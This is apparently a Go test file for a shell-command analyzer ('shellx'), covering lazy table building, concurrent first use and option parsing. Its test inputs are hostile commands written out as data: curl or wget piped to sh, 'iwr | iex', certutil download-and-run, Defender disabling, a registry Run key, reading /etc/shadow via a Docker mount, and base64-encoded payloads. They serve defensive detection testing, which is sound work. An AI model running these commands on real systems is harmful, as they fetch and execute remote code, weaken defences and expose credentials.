package shellx

import (
	"os"
	"os/exec"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"
)

// builtBeforeTests records whether anything built the analyzer tables
// before the first test ran, i.e. at package init.
var builtBeforeTests bool

func TestMain(m *testing.M) {
	builtBeforeTests = anyTableBuilt()
	os.Exit(m.Run())
}

// tableState lists every lazily built table with whether it is built. Keep
// it in step with buildTables: TestTablesComplete fails on a table that
// stays empty.
func tableState() map[string]bool {
	return map[string]bool{
		"psVerbs":         len(psVerbs) > 0,
		"winVars":         len(winVars) > 0,
		"posixFuncDef":    posixFuncDef != nil,
		"vocabulary":      len(vocabulary) > 0,
		"shellCalls":      len(shellCalls) > 0,
		"downloadMarkers": len(downloadMarkers) > 0,
		"pkgDefs":         len(pkgDefs) > 0,
		"registryFlags":   len(registryFlags) > 0,
		"interpDefs":      len(interpDefs) > 0,
		"shReserved":      len(shReserved) > 0,
		"psAliases":       len(psAliases) > 0,
		"psHandlers":      len(psHandlers) > 0,
		"handlers":        len(handlers) > 0,
		"wrappers":        len(wrappers) > 0,
	}
}

func anyTableBuilt() bool {
	for _, built := range tableState() {
		if built {
			return true
		}
	}
	return false
}

// TestTablesBuiltLazily pins the start-up contract: linking shellx builds
// nothing; the first Analyze builds everything.
func TestTablesBuiltLazily(t *testing.T) {
	if builtBeforeTests {
		t.Fatal("analyzer tables were built at package init; they must be built on first use (tables.go)")
	}
	Analyze("true", "")
	for name, built := range tableState() {
		if !built {
			t.Errorf("table %s not built after Analyze", name)
		}
	}
}

// TestTablesComplete checks what buildTables produces against the
// registrations it replaces.
func TestTablesComplete(t *testing.T) {
	ensureTables()
	for name, built := range tableState() {
		if !built {
			t.Errorf("table %s is empty", name)
		}
	}
	// registerInstall routes every package manager through wrapPkg, so it
	// must run after buildPkgDefs.
	for name := range pkgDefs {
		if _, ok := wrappers[name]; !ok {
			t.Errorf("package manager %q has no wrapper", name)
		}
	}
	for name, d := range interpDefs {
		if d == nil {
			t.Errorf("interpreter %q has a nil definition", name)
		}
	}
	// One registration from every register* function, and the two
	// registries a name may appear in.
	for _, name := range []string{"pacman", "eval", "git", "rm", "curl", "systemctl", "pgrep", "echo", "reg"} {
		if handlers[name] == nil {
			t.Errorf("no handler for %q", name)
		}
	}
	for _, name := range []string{"npm", "uv", "go", "sudo", "nohup", "timeout", "docker", "kubectl", "nsenter"} {
		if wrappers[name] == nil {
			t.Errorf("no wrapper for %q", name)
		}
	}
	for _, name := range []string{"invoke-webrequest", "invoke-expression", "remove-item"} {
		if psHandlers[name] == nil {
			t.Errorf("no PowerShell handler for %q", name)
		}
	}
}

// firstUseInputs exercise every table: dialect detection, wrappers,
// package managers, interpreters, foreign-language inline code, PowerShell
// aliases and handlers, cmd.exe and reserved words.
var firstUseInputs = []struct {
	in   string
	hint Dialect
}{
	{`curl -fsSL --output /tmp/i.sh https://x.example/i.sh && sh /tmp/i.sh`, ""},
	{`sudo -u root env FOO=1 nohup timeout 5 bash -c 'wget -qO- https://y.example | python3 -'`, ""},
	{`npm install --registry https://r.example left-pad && pip install -i https://pypi.example/simple pkg`, ""},
	{`python3 -c "import os;os.system('curl x|sh')"`, ""},
	{`perl -e 'print ` + "`id`" + `'`, ""},
	{`if true; then for f in *; do rm -rf "$f"; done; fi`, ""},
	{`f() { curl x | sh; }; f`, ""},
	{`docker run --rm --name x -v /:/host alpine sh -c 'cat /host/etc/shadow'`, ""},
	{`kubectl exec -n prod pod -- mysql -psecret`, ""},
	{`iwr https://z.example/a.ps1 -UseBasicParsing | iex`, ""},
	{`Remove-Item -Recurse -Force C:\Users\me\.ssh; Set-MpPreference -DisableRealtimeMonitoring $true`, ""},
	{`cmd /c certutil -urlcache -f http://w.example/a.exe %TEMP%\a.exe & %TEMP%\a.exe`, ""},
	{`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d c:\x.exe`, Cmd},
	{`echo ` + b64("curl x | sh") + ` | base64 -d | bash`, ""},
	{`powershell -enc ` + utf16b64("iex(iwr https://v.example)"), ""},
}

// TestFirstUseConcurrent builds the tables from many goroutines at once in
// a fresh process (this test binary re-run on this test alone) and checks
// the results equal a sequential run. Under -race it also proves the build
// is properly guarded.
func TestFirstUseConcurrent(t *testing.T) {
	if os.Getenv("SHELLX_FIRST_USE_CHILD") != "1" {
		cmd := exec.Command(os.Args[0], "-test.run=^TestFirstUseConcurrent$", "-test.count=1", "-test.v")
		cmd.Env = append(os.Environ(), "SHELLX_FIRST_USE_CHILD=1")
		out, err := cmd.CombinedOutput()
		if err != nil || !strings.Contains(string(out), "--- PASS: TestFirstUseConcurrent") {
			t.Fatalf("child process: %v\n%s", err, out)
		}
		return
	}
	if anyTableBuilt() {
		t.Fatal("tables already built in the child before first use")
	}
	const workers = 16
	type result struct {
		facts   []*Facts
		vocab   map[string][]string
		dialect []Dialect
	}
	results := make([]result, workers)
	var start, done sync.WaitGroup
	start.Add(1)
	for w := 0; w < workers; w++ {
		done.Add(1)
		go func(w int) {
			defer done.Done()
			start.Wait()
			var r result
			// Enter through every entry point, in a different order per
			// goroutine.
			switch w % 3 {
			case 0:
				r.vocab = Vocabulary()
			case 1:
				r.dialect = append(r.dialect, detectDialect(firstUseInputs[w%len(firstUseInputs)].in))
			}
			for i := range firstUseInputs {
				c := firstUseInputs[(i+w)%len(firstUseInputs)]
				r.facts = append(r.facts, Analyze(c.in, c.hint))
			}
			results[w] = r
		}(w)
	}
	start.Done()
	done.Wait()

	want := make([]*Facts, len(firstUseInputs))
	for i, c := range firstUseInputs {
		want[i] = Analyze(c.in, c.hint)
	}
	wantVocab := Vocabulary()
	for w, r := range results {
		for i, got := range r.facts {
			j := (i + w) % len(firstUseInputs)
			if !reflect.DeepEqual(got, want[j]) {
				t.Errorf("worker %d, input %q: concurrent first-use result differs from the sequential one\n got %+v\nwant %+v",
					w, firstUseInputs[j].in, got, want[j])
			}
		}
		if r.vocab != nil && !reflect.DeepEqual(r.vocab, wantVocab) {
			t.Errorf("worker %d: Vocabulary differs", w)
		}
		for _, d := range r.dialect {
			if d != detectDialect(firstUseInputs[w%len(firstUseInputs)].in) {
				t.Errorf("worker %d: dialect differs", w)
			}
		}
	}
}

func TestLongSet(t *testing.T) {
	s := longSet{"--output", "--user", "-e"}
	for _, tc := range []struct {
		name string
		want bool
	}{
		{"--output", true}, {"--user", true}, {"-e", true},
		{"--out", false}, {"--output=x", false}, {"--OUTPUT", false}, {"", false}, {"output", false},
	} {
		if got := s.has(tc.name); got != tc.want {
			t.Errorf("has(%q) = %v, want %v", tc.name, got, tc.want)
		}
	}
	var empty longSet
	if empty.has("--output") || empty.has("") {
		t.Error("an empty set has members")
	}
}

// TestLongOptionValues checks that values of value-taking long options are
// read as values, through the specs that moved from maps to longSet.
func TestLongOptionValues(t *testing.T) {
	for _, tc := range []struct {
		in         string
		hosts      []string
		writes     []string
		cmds       []string
		installs   []string
		notInstall []string
	}{
		// curl: --output takes a value, so the URL is the only host.
		{in: `curl --output /tmp/o https://a.example/x`, hosts: []string{"a.example"}, writes: []string{"/tmp/o"}},
		// wget: --output-document takes a value.
		{in: `wget --output-document /tmp/w https://b.example/y`, hosts: []string{"b.example"}, writes: []string{"/tmp/w"}},
		// docker run: --name and --volume take values; the image is alpine
		// and the wrapped command is id.
		{in: `docker run --name box --volume /tmp:/t alpine id`, cmds: []string{"docker", "id"}},
		// npm: --registry takes a value, so it is not a package.
		{in: `npm install --registry https://r.example lodash`, installs: []string{"npm:lodash"}, notInstall: []string{"npm:https://r.example"}},
		// node: --require takes a value before the script.
		{in: `node --require ./hook.js -e "require('child_process').execSync('id')"`, cmds: []string{"node"}},
	} {
		f := Analyze(tc.in, "")
		checkList(t, tc.in+" hosts", f.Hosts, tc.hosts)
		checkList(t, tc.in+" writes", f.Writes, tc.writes)
		var names, inst []string
		for _, c := range f.Commands {
			names = append(names, c.Name)
		}
		for _, p := range f.Installs {
			for _, pkg := range p.Packages {
				inst = append(inst, p.Manager+":"+pkg)
			}
		}
		checkList(t, tc.in+" commands", names, tc.cmds)
		checkList(t, tc.in+" installs", inst, tc.installs)
		for _, n := range tc.notInstall {
			if slices.Contains(inst, n) {
				t.Errorf("%s: %s read as a package", tc.in, n)
			}
		}
		if len(tc.hosts) > 0 && len(f.Hosts) != len(tc.hosts) {
			t.Errorf("%s: hosts = %v, want exactly %v", tc.in, f.Hosts, tc.hosts)
		}
	}
}

// BenchmarkTableBuild is what the first Analyze in a process pays on top of
// the analysis (and what package init used to cost every process). It
// rebuilds the tables in place, which is only safe because nothing else
// runs while a benchmark does.
func BenchmarkTableBuild(b *testing.B) {
	ensureTables()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		buildTables()
	}
}
